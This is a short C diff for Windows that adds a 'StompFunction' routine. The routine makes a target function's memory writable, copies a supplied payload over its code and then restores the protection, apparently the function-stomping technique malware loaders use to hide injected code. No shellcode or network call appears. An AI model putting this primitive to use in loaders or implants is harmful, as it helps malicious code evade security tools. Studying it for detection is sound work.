@@ -344,3 +344,24 @@ _cleanup:
 	
 	return state;
 }
+
+BOOL StompFunction
+(
+	IN    PVOID  pTargetFuncAddress,
+	IN	  PUCHAR pPayload,
+	IN    SIZE_T sPayloadSize
+)
+{
+
+	if (!pTargetFuncAddress || !pPayload || !sPayloadSize) return FALSE;
+
+	DWORD dwOldProtections = 0;
+
+	if (!VirtualProtect(pTargetFuncAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtections)) return FALSE;
+
+	memcpy(pTargetFuncAddress, pPayload, sPayloadSize);
+
+	if (!VirtualProtect(pTargetFuncAddress, sPayloadSize, dwOldProtections, &dwOldProtections)) return FALSE;
+
+	return TRUE;
+}
